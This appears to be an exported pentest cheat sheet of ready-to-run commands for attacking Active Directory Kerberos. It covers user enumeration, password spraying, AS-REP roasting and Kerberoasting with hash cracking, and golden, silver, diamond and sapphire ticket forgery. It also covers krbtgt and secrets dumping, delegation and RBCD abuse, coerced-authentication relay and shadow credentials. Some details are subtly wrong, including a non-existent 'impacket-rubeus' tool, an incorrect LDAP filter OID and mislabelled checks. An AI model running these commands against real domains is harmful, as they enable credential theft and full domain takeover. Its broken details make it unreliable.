---
id: "qyvhec3vsmpn04vq8"
title: "kerberos"
description: ""
tags: []
order: 5
createdAt: "2026-05-26T19:01:58.304Z"
updatedAt: "2026-05-26T19:02:17.258Z"
---

## Recon & Enumeration
<!-- section: {"id":"54bypzfb6mpn054bt","order":0,"collapsed":false} -->

### 231u1nm40mpn054e0
```bash
nmap -sV -sC -p 88,464 $TARGET
nmap -sV -p 88 --script krb5-enum-users $TARGET
rustscan -a $TARGET -p 88,464 -- -sV -sC
```

_Recon & Enumeration Initial Kerberos port detection and fingerprinting._

**Tags:** kerberos, recon, nmap, rustscan
<!-- cmd: {"id":"231u1nm40mpn054e0","language":"bash","sectionId":"54bypzfb6mpn054bt","tags":["kerberos","recon","nmap","rustscan"]} -->

### a4v8r8xjzmpn054e5
```bash
netexec smb $DC -u '' -p ''
netexec ldap $DC -u '' -p '' --kdcHost $DC
impacket-GetADUsers $DOMAIN/ -dc-ip $DC -all
```

_Tags: #kerberos, #recon, #nmap, #rustscan Check Kerberos availability and domain info._

**Tags:** kerberos, recon, netexec, impacket, domain-info
<!-- cmd: {"id":"a4v8r8xjzmpn054e5","language":"bash","sectionId":"54bypzfb6mpn054bt","tags":["kerberos","recon","netexec","impacket","domain-info"]} -->

## User Enumeration
<!-- section: {"id":"mifgbt71ampn054c0","order":1,"collapsed":false} -->

### 7b2ekp5kfmpn054ek
```bash
kerbrute userenum --dc $DC -d $DOMAIN users.txt
kerbrute userenum --dc $DC -d $DOMAIN users.txt -o valid_users.txt
kerbrute userenum --dc $DC -d $DOMAIN /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

_User Enumeration Enumerate valid domain users via Kerberos (no credentials needed)._

**Tags:** kerberos, userenum, kerbrute, unauthenticated, recon
<!-- cmd: {"id":"7b2ekp5kfmpn054ek","language":"bash","sectionId":"mifgbt71ampn054c0","tags":["kerberos","userenum","kerbrute","unauthenticated","recon"]} -->

### yf5y1pfvampn054en
```bash
impacket-GetADUsers $DOMAIN/ -dc-ip $DC -all
impacket-GetADUsers $DOMAIN/$USER:$PASS -dc-ip $DC -all
```

_Tags: #kerberos, #userenum, #kerbrute, #unauthenticated, #recon Enumerate users via Kerberos with impacket._

**Tags:** kerberos, users, impacket, enum
<!-- cmd: {"id":"yf5y1pfvampn054en","language":"bash","sectionId":"mifgbt71ampn054c0","tags":["kerberos","users","impacket","enum"]} -->

## Password Spraying
<!-- section: {"id":"2v74n4iz7mpn054c5","order":2,"collapsed":false} -->

### wx5310lsympn054ez
```bash
kerbrute passwordspray --dc $DC -d $DOMAIN valid_users.txt $PASS
kerbrute passwordspray --dc $DC -d $DOMAIN valid_users.txt $PASS -o sprayed.txt
kerbrute bruteuser --dc $DC -d $DOMAIN passwords.txt $USER
```

_Password Spraying Spray passwords via Kerberos — no NTLM, less logging._

**Tags:** kerberos, password-spray, kerbrute, authentication
<!-- cmd: {"id":"wx5310lsympn054ez","language":"bash","sectionId":"2v74n4iz7mpn054c5","tags":["kerberos","password-spray","kerbrute","authentication"]} -->

### kt1phzsk0mpn054f3
```bash
netexec smb $DC -u users.txt -p $PASS --kerberos --continue-on-success
netexec ldap $DC -u users.txt -p $PASS --kerberos --continue-on-success
```

_Tags: #kerberos, #password-spray, #kerbrute, #authentication Spray via netexec with Kerberos auth._

**Tags:** kerberos, password-spray, netexec, authentication
<!-- cmd: {"id":"kt1phzsk0mpn054f3","language":"bash","sectionId":"2v74n4iz7mpn054c5","tags":["kerberos","password-spray","netexec","authentication"]} -->

## ASREPRoasting
<!-- section: {"id":"y7xqzlziumpn054c8","order":3,"collapsed":false} -->

### ixzc0i4qympn054ff
```bash
# Unauthenticated — requires username list
impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -dc-ip $DC -format hashcat -outputfile asrep.txt
impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -dc-ip $DC -format john -outputfile asrep.john

# Authenticated — auto-finds vulnerable accounts
impacket-GetNPUsers $DOMAIN/$USER:$PASS -dc-ip $DC -request -format hashcat -outputfile asrep.txt
impacket-GetNPUsers $DOMAIN/$USER -hashes :$HASH -dc-ip $DC -request -format hashcat -outputfile asrep.txt
netexec ldap $DC -u $USER -p $PASS --asreproast asrep.txt
```

_ASREPRoasting Harvest AS-REP hashes — accounts without pre-authentication._

**Tags:** kerberos, asreproasting, impacket, netexec, credential-access
<!-- cmd: {"id":"ixzc0i4qympn054ff","language":"bash","sectionId":"y7xqzlziumpn054c8","tags":["kerberos","asreproasting","impacket","netexec","credential-access"]} -->

### wwz4vjguvmpn054fk
```bash
hashcat -m 18200 asrep.txt rockyou.txt
hashcat -m 18200 asrep.txt rockyou.txt -r rules/best64.rule
hashcat -m 18200 asrep.txt rockyou.txt -r rules/d3ad0ne.rule
john --format=krb5asrep asrep.txt --wordlist=rockyou.txt
```

_Tags: #kerberos, #asreproasting, #impacket, #netexec, #credential-access Crack AS-REP hashes._

**Tags:** kerberos, asreproasting, hashcat, john, cracking
<!-- cmd: {"id":"wwz4vjguvmpn054fk","language":"bash","sectionId":"y7xqzlziumpn054c8","tags":["kerberos","asreproasting","hashcat","john","cracking"]} -->

## Kerberoasting
<!-- section: {"id":"s6oqfnnzcmpn054cc","order":4,"collapsed":false} -->

### kxpwwr1hkmpn054fw
```bash
# Authenticated Kerberoasting
impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $DC -request -outputfile kerberoast.txt
impacket-GetUserSPNs $DOMAIN/$USER -hashes :$HASH -dc-ip $DC -request -outputfile kerberoast.txt
impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $DC -request -outputfile kerberoast.txt -save

# Via netexec
netexec ldap $DC -u $USER -p $PASS --kerberoasting kerberoast.txt
netexec ldap $DC -u $USER -H $HASH --kerberoasting kerberoast.txt
```

_Kerberoasting Request TGS tickets for SPN accounts and crack offline._

**Tags:** kerberos, kerberoasting, spn, impacket, netexec, credential-access
<!-- cmd: {"id":"kxpwwr1hkmpn054fw","language":"bash","sectionId":"s6oqfnnzcmpn054cc","tags":["kerberos","kerberoasting","spn","impacket","netexec","credential-access"]} -->

### clu26xcrumpn054g0
```bash
hashcat -m 13100 kerberoast.txt rockyou.txt
hashcat -m 13100 kerberoast.txt rockyou.txt -r rules/best64.rule
hashcat -m 13100 kerberoast.txt rockyou.txt -r rules/d3ad0ne.rule
john --format=krb5tgs kerberoast.txt --wordlist=rockyou.txt
```

_Tags: #kerberos, #kerberoasting, #spn, #impacket, #netexec, #credential-access Crack TGS hashes._

**Tags:** kerberos, kerberoasting, hashcat, john, cracking
<!-- cmd: {"id":"clu26xcrumpn054g0","language":"bash","sectionId":"s6oqfnnzcmpn054cc","tags":["kerberos","kerberoasting","hashcat","john","cracking"]} -->

### mxakfmcjpmpn054g3
```bash
targetedKerberoast.py -d $DOMAIN -u $USER -p $PASS --dc-ip $DC -o targeted.txt
targetedKerberoast.py -d $DOMAIN -u $USER -p $PASS --dc-ip $DC --only-abuse
targetedKerberoast.py -d $DOMAIN -u $USER -p $PASS --dc-ip $DC --request-user $TARGET_USER
```

_Tags: #kerberos, #kerberoasting, #hashcat, #john, #cracking Targeted Kerberoasting — abuse ACL WriteProperty to set SPN._

**Tags:** kerberos, kerberoasting, targeted, acl-abuse, credential-access, ad-abuse
<!-- cmd: {"id":"mxakfmcjpmpn054g3","language":"bash","sectionId":"s6oqfnnzcmpn054cc","tags":["kerberos","kerberoasting","targeted","acl-abuse","credential-access","ad-abuse"]} -->

## Pass-the-Ticket
<!-- section: {"id":"8ct7qr7uympn054cf","order":5,"collapsed":false} -->

### fz8mhlff2mpn054gh
```bash
# List current tickets
klist

# Import ticket
impacket-ticketConverter ticket.ccache ticket.kirbi
export KRB5CCNAME=/path/to/ticket.ccache

# Use ticket with impacket tools
impacket-psexec $DOMAIN/$USER@$TARGET -k -no-pass
impacket-secretsdump $DOMAIN/$USER@$TARGET -k -no-pass
impacket-wmiexec $DOMAIN/$USER@$TARGET -k -no-pass
```

_Pass-the-Ticket Inject and use Kerberos tickets (TGT/TGS)._

**Tags:** kerberos, pass-the-ticket, ptt, impacket, lateral-movement
<!-- cmd: {"id":"fz8mhlff2mpn054gh","language":"bash","sectionId":"8ct7qr7uympn054cf","tags":["kerberos","pass-the-ticket","ptt","impacket","lateral-movement"]} -->

### 7qwjf1itmmpn054gk
```bash
export KRB5CCNAME=/path/to/ticket.ccache
netexec smb $TARGET -u $USER -p '' --kerberos
netexec ldap $DC -u $USER -p '' --kerberos
```

_Tags: #kerberos, #pass-the-ticket, #ptt, #impacket, #lateral-movement Pass-the-Ticket via netexec._

**Tags:** kerberos, pass-the-ticket, netexec, lateral-movement
<!-- cmd: {"id":"7qwjf1itmmpn054gk","language":"bash","sectionId":"8ct7qr7uympn054cf","tags":["kerberos","pass-the-ticket","netexec","lateral-movement"]} -->

## Overpass-the-Hash / Pass-the-Key
<!-- section: {"id":"rn8qampe1mpn054cj","order":6,"collapsed":false} -->

### z4gujxm6dmpn054gs
```bash
impacket-getTGT $DOMAIN/$USER -hashes :$HASH -dc-ip $DC
impacket-getTGT $DOMAIN/$USER -aesKey $AES_KEY -dc-ip $DC
export KRB5CCNAME=$USER.ccache
impacket-psexec $DOMAIN/$USER@$TARGET -k -no-pass
```

_Overpass-the-Hash / Pass-the-Key Convert NTLM hash to Kerberos TGT._

**Tags:** kerberos, overpass-the-hash, pass-the-key, impacket, lateral-movement
<!-- cmd: {"id":"z4gujxm6dmpn054gs","language":"bash","sectionId":"rn8qampe1mpn054cj","tags":["kerberos","overpass-the-hash","pass-the-key","impacket","lateral-movement"]} -->

## Silver Ticket
<!-- section: {"id":"uaqvmz25xmpn054cl","order":7,"collapsed":false} -->

### y5smxnfq3mpn054h3
```bash
# Get domain SID first
impacket-getPac $DOMAIN/$USER:$PASS -targetUser $USER -dc-ip $DC

# Forge silver ticket
impacket-ticketer -nthash $SERVICE_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN -spn cifs/$TARGET $USER
impacket-ticketer -nthash $SERVICE_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN -spn http/$TARGET $USER
impacket-ticketer -nthash $SERVICE_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN -spn MSSQLSvc/$TARGET:1433 $USER

# Use forged ticket
export KRB5CCNAME=$USER.ccache
impacket-psexec $DOMAIN/$USER@$TARGET -k -no-pass
```

_Silver Ticket Forge TGS ticket for specific service using service account NTLM hash._

**Tags:** kerberos, silver-ticket, ticket-forgery, impacket, lateral-movement, ad-abuse
<!-- cmd: {"id":"y5smxnfq3mpn054h3","language":"bash","sectionId":"uaqvmz25xmpn054cl","tags":["kerberos","silver-ticket","ticket-forgery","impacket","lateral-movement","ad-abuse"]} -->

## Golden Ticket
<!-- section: {"id":"wevypl4sgmpn054cq","order":8,"collapsed":false} -->

### r7dn1iaotmpn054ha
```bash
# Dump krbtgt hash first
impacket-secretsdump $DOMAIN/$USER:$PASS@$DC -just-dc-user krbtgt

# Get domain SID
impacket-lookupsid $DOMAIN/$USER:$PASS@$DC | grep "Domain SID"

# Forge golden ticket
impacket-ticketer -nthash $KRBTGT_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN Administrator
impacket-ticketer -nthash $KRBTGT_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN -duration 3650 Administrator

# Use golden ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec $DOMAIN/Administrator@$DC -k -no-pass
impacket-secretsdump $DOMAIN/Administrator@$DC -k -no-pass
```

_Golden Ticket Forge TGT using krbtgt NTLM hash — full domain persistence._

**Tags:** kerberos, golden-ticket, krbtgt, persistence, ticket-forgery, impacket, ad-abuse
<!-- cmd: {"id":"r7dn1iaotmpn054ha","language":"bash","sectionId":"wevypl4sgmpn054cq","tags":["kerberos","golden-ticket","krbtgt","persistence","ticket-forgery","impacket","ad-abuse"]} -->

## Diamond Ticket
<!-- section: {"id":"hzo9abo21mpn054cs","order":9,"collapsed":false} -->

### 9zo5gvdg0mpn054hg
```bash
impacket-ticketer -request -domain $DOMAIN -user $USER -password $PASS \
  -nthash $KRBTGT_HASH -domain-sid $DOMAIN_SID -dc-ip $DC \
  -groups 512,513,518,519,520 Administrator

export KRB5CCNAME=Administrator.ccache
impacket-psexec $DOMAIN/Administrator@$DC -k -no-pass
```

_Diamond Ticket Modify legitimate TGT PAC — stealthier than Golden Ticket._

**Tags:** kerberos, diamond-ticket, ticket-forgery, stealth, impacket, ad-abuse
<!-- cmd: {"id":"9zo5gvdg0mpn054hg","language":"bash","sectionId":"hzo9abo21mpn054cs","tags":["kerberos","diamond-ticket","ticket-forgery","stealth","impacket","ad-abuse"]} -->

## Sapphire Ticket
<!-- section: {"id":"eubl8jdd6mpn054cw","order":10,"collapsed":false} -->

### on8ahuy2pmpn054hu
```bash
impacket-ticketer -request -domain $DOMAIN -user $USER -password $PASS \
  -aesKey $KRBTGT_AES -domain-sid $DOMAIN_SID -dc-ip $DC \
  -impersonate Administrator Administrator

export KRB5CCNAME=Administrator.ccache
impacket-secretsdump $DOMAIN/Administrator@$DC -k -no-pass
```

_Sapphire Ticket Steal PAC from existing legitimate TGT — most stealthy._

**Tags:** kerberos, sapphire-ticket, ticket-forgery, stealth, impacket, ad-abuse
<!-- cmd: {"id":"on8ahuy2pmpn054hu","language":"bash","sectionId":"eubl8jdd6mpn054cw","tags":["kerberos","sapphire-ticket","ticket-forgery","stealth","impacket","ad-abuse"]} -->

## Delegation Attacks
<!-- section: {"id":"7q47o4tw5mpn054d0","order":11,"collapsed":false} -->

### 08qy1clazmpn054i2
```bash
netexec ldap $DC -u $USER -p $PASS --trusted-for-delegation
impacket-findDelegation $DOMAIN/$USER:$PASS -dc-ip $DC
bloodyAD -u $USER -p $PASS -d $DOMAIN --host $DC get search \
  --filter '(userAccountControl:1.2.840.113549.1.1.11:=524288)' \
  --attr sAMAccountName dNSHostName
```

_Delegation Attacks Find hosts with unconstrained delegation._

**Tags:** kerberos, unconstrained-delegation, enum, netexec, bloodyad
<!-- cmd: {"id":"08qy1clazmpn054i2","language":"bash","sectionId":"7q47o4tw5mpn054d0","tags":["kerberos","unconstrained-delegation","enum","netexec","bloodyad"]} -->

### cjz714kmhmpn054i6
```bash
# Terminal 1 — Monitor for TGTs on compromised host
impacket-rubeus monitor /interval:5 /nowrap

# Terminal 2 — Coerce DC authentication
coercer coerce -u $USER -p $PASS -d $DOMAIN -l $COMPROMISED_HOST -t $DC
impacket-PetitPotam $COMPROMISED_HOST $DC

# Extract and use TGT
impacket-ticketConverter dc_tgt.kirbi dc_tgt.ccache
export KRB5CCNAME=dc_tgt.ccache
impacket-secretsdump $DOMAIN/Administrator@$DC -k -no-pass
```

_Tags: #kerberos, #unconstrained-delegation, #enum, #netexec, #bloodyad Abuse unconstrained delegation — coerce DC auth and extract TGT._

**Tags:** kerberos, unconstrained-delegation, petitpotam, coercer, tgt-extraction, ad-abuse
<!-- cmd: {"id":"cjz714kmhmpn054i6","language":"bash","sectionId":"7q47o4tw5mpn054d0","tags":["kerberos","unconstrained-delegation","petitpotam","coercer","tgt-extraction","ad-abuse"]} -->

### lbedrnbv3mpn054i9
```bash
impacket-findDelegation $DOMAIN/$USER:$PASS -dc-ip $DC
netexec ldap $DC -u $USER -p $PASS -M delegation
bloodyAD -u $USER -p $PASS -d $DOMAIN --host $DC get search \
  --filter '(msDS-AllowedToDelegateTo=*)' \
  --attr sAMAccountName msDS-AllowedToDelegateTo
```

_Tags: #kerberos, #unconstrained-delegation, #petitpotam, #coercer, #tgt-extraction, #ad-abuse Find accounts with constrained delegation (S4U2Proxy)._

**Tags:** kerberos, constrained-delegation, enum, impacket, bloodyad
<!-- cmd: {"id":"lbedrnbv3mpn054i9","language":"bash","sectionId":"7q47o4tw5mpn054d0","tags":["kerberos","constrained-delegation","enum","impacket","bloodyad"]} -->

### jvl8rjwz7mpn054id
```bash
# Get TGT for service account
impacket-getTGT $DOMAIN/$SERVICE_USER:$PASS -dc-ip $DC

# Request TGS for target service impersonating admin
impacket-getST $DOMAIN/$SERVICE_USER:$PASS \
  -spn cifs/$TARGET -impersonate Administrator -dc-ip $DC

export KRB5CCNAME=Administrator@cifs_$TARGET.ccache
impacket-psexec $DOMAIN/Administrator@$TARGET -k -no-pass
impacket-secretsdump $DOMAIN/Administrator@$TARGET -k -no-pass
```

_Tags: #kerberos, #constrained-delegation, #enum, #impacket, #bloodyad Abuse constrained delegation via S4U2Self + S4U2Proxy._

**Tags:** kerberos, constrained-delegation, s4u2proxy, s4u2self, impacket, ad-abuse
<!-- cmd: {"id":"jvl8rjwz7mpn054id","language":"bash","sectionId":"7q47o4tw5mpn054d0","tags":["kerberos","constrained-delegation","s4u2proxy","s4u2self","impacket","ad-abuse"]} -->

### rurns95ijmpn054ih
```bash
# Step 1 — Create computer account (or use existing)
impacket-addcomputer $DOMAIN/$USER:$PASS -dc-ip $DC -computer-name "EVIL$" -computer-pass "Evil1234!"

# Step 2 — Set RBCD on target
bloodyAD -u $USER -p $PASS -d $DOMAIN --host $DC set object $TARGET \
  msDS-AllowedToActOnBehalfOfOtherIdentity 'EVIL$'

# Or with impacket
impacket-rbcd $DOMAIN/$USER:$PASS -dc-ip $DC \
  -action write -delegate-from "EVIL$" -delegate-to "$TARGET$"

# Step 3 — Get TGT for fake computer
impacket-getTGT $DOMAIN/'EVIL$':Evil1234! -dc-ip $DC

# Step 4 — S4U2Self + S4U2Proxy
impacket-getST $DOMAIN/'EVIL$':Evil1234! \
  -spn cifs/$TARGET -impersonate Administrator -dc-ip $DC

# Step 5 — Use ticket
export KRB5CCNAME=Administrator@cifs_$TARGET.ccache
impacket-psexec $DOMAIN/Administrator@$TARGET -k -no-pass
impacket-secretsdump $DOMAIN/Administrator@$TARGET -k -no-pass
```

_Tags: #kerberos, #constrained-delegation, #s4u2proxy, #s4u2self, #impacket, #ad-abuse Abuse RBCD — write msDS-AllowedToActOnBehalfOfOtherIdentity._

**Tags:** kerberos, rbcd, delegation, impacket, bloodyad, privilege-escalation, ad-abuse
<!-- cmd: {"id":"rurns95ijmpn054ih","language":"bash","sectionId":"7q47o4tw5mpn054d0","tags":["kerberos","rbcd","delegation","impacket","bloodyad","privilege-escalation","ad-abuse"]} -->

## AS-REP + TGT Relay
<!-- section: {"id":"ps1enlktqmpn054d3","order":12,"collapsed":false} -->

### xf1ofr900mpn054io
```bash
# Terminal 1
krbrelayx.py -aesKey $AES_KEY

# Terminal 2 — Coerce auth
printerbug.py $DOMAIN/$USER:$PASS@$TARGET $LHOST
coercer coerce -u $USER -p $PASS -d $DOMAIN -l $LHOST -t $TARGET
```

_AS-REP + TGT Relay Relay AS-REQ to obtain TGT without credentials (krbrelayx)._

**Tags:** kerberos, krbrelayx, relay, tgt, ad-abuse
<!-- cmd: {"id":"xf1ofr900mpn054io","language":"bash","sectionId":"ps1enlktqmpn054d3","tags":["kerberos","krbrelayx","relay","tgt","ad-abuse"]} -->

## Kerberos Abuse via Shadow Credentials
<!-- section: {"id":"7rpdtxilempn054d6","order":13,"collapsed":false} -->

### 790f5ln7empn054iu
```bash
# Add shadow credential (requires WriteProperty on msDS-KeyCredentialLink)
pywhisker.py -d $DOMAIN -u $USER -p $PASS --target $TARGET_USER --action add --dc-ip $DC

# Get TGT using certificate
impacket-getTGT $DOMAIN/$TARGET_USER -pfx-base64 $PFX_B64 -dc-ip $DC
export KRB5CCNAME=$TARGET_USER.ccache

# Get NT hash via PKINIT
impacket-getnthash $DOMAIN/$TARGET_USER -pfx-base64 $PFX_B64 -dc-ip $DC
```

_Kerberos Abuse via Shadow Credentials Add Shadow Credentials to target then get TGT._

**Tags:** kerberos, shadow-credentials, pywhisker, pkinit, credential-access, ad-abuse
<!-- cmd: {"id":"790f5ln7empn054iu","language":"bash","sectionId":"7rpdtxilempn054d6","tags":["kerberos","shadow-credentials","pywhisker","pkinit","credential-access","ad-abuse"]} -->

## Vulnerability Checks
<!-- section: {"id":"bv8wwa4ekmpn054da","order":14,"collapsed":false} -->

### 300p31rh6mpn054j2
```bash
# ZeroLogon
netexec smb $DC -u '' -p '' -M zerologon

# noPac / Sam Account Name spoofing (CVE-2021-42278/42287)
netexec smb $DC -u $USER -p $PASS -M nopac

# MS14-068 — Kerberos privilege escalation
impacket-goldenPac $DOMAIN/$USER:$PASS@$DC

# PAC validation bypass check
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=$DOMAIN $DC
```

_Vulnerability Checks Check for Kerberos-related vulnerabilities._

**Tags:** kerberos, vuln-check, zerologon, nopac, ms14-068, netexec, nmap
<!-- cmd: {"id":"300p31rh6mpn054j2","language":"bash","sectionId":"bv8wwa4ekmpn054da","tags":["kerberos","vuln-check","zerologon","nopac","ms14-068","netexec","nmap"]} -->

## Ticket Extraction & Conversion
<!-- section: {"id":"4tj7vs5hampn054dd","order":15,"collapsed":false} -->

### k20bu6lb0mpn054j9
```bash
# Convert ccache to kirbi and back
impacket-ticketConverter ticket.ccache ticket.kirbi
impacket-ticketConverter ticket.kirbi ticket.ccache

# List tickets in ccache
klist -e
klist -A

# Set ticket for use
export KRB5CCNAME=/path/to/ticket.ccache
```

_Ticket Extraction & Conversion Export and convert tickets between formats._

**Tags:** kerberos, ticket, ccache, kirbi, impacket
<!-- cmd: {"id":"k20bu6lb0mpn054j9","language":"bash","sectionId":"4tj7vs5hampn054dd","tags":["kerberos","ticket","ccache","kirbi","impacket"]} -->

## Misconfigurations Checklist
<!-- section: {"id":"6l1v1uidampn054dg","order":16,"collapsed":false} -->

### icjgktfwmmpn054jn
```bash
# 1. ASREPRoastable accounts
netexec ldap $DC -u $USER -p $PASS --asreproast /dev/stdout

# 2. Kerberoastable accounts
netexec ldap $DC -u $USER -p $PASS --kerberoasting /dev/stdout

# 3. Unconstrained delegation hosts
netexec ldap $DC -u $USER -p $PASS --trusted-for-delegation

# 4. Constrained delegation accounts
impacket-findDelegation $DOMAIN/$USER:$PASS -dc-ip $DC

# 5. RBCD misconfigurations
bloodyAD -u $USER -p $PASS -d $DOMAIN --host $DC get search \
  --filter '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)' \
  --attr sAMAccountName msDS-AllowedToActOnBehalfOfOtherIdentity

# 6. krbtgt password age (should be rotated)
netexec ldap $DC -u $USER -p $PASS --users | grep krbtgt

# 7. noPac vulnerability
netexec smb $DC -u $USER -p $PASS -M nopac

# 8. MS14-068 check
impacket-goldenPac $DOMAIN/$USER:$PASS@$DC 2>&1 | head -20
```

_Misconfigurations Checklist Quick sweep for all Kerberos misconfigurations._

**Tags:** kerberos, misconfiguration, checklist, delegation, asreproasting, kerberoasting
<!-- cmd: {"id":"icjgktfwmmpn054jn","language":"bash","sectionId":"6l1v1uidampn054dg","tags":["kerberos","misconfiguration","checklist","delegation","asreproasting","kerberoasting"]} -->
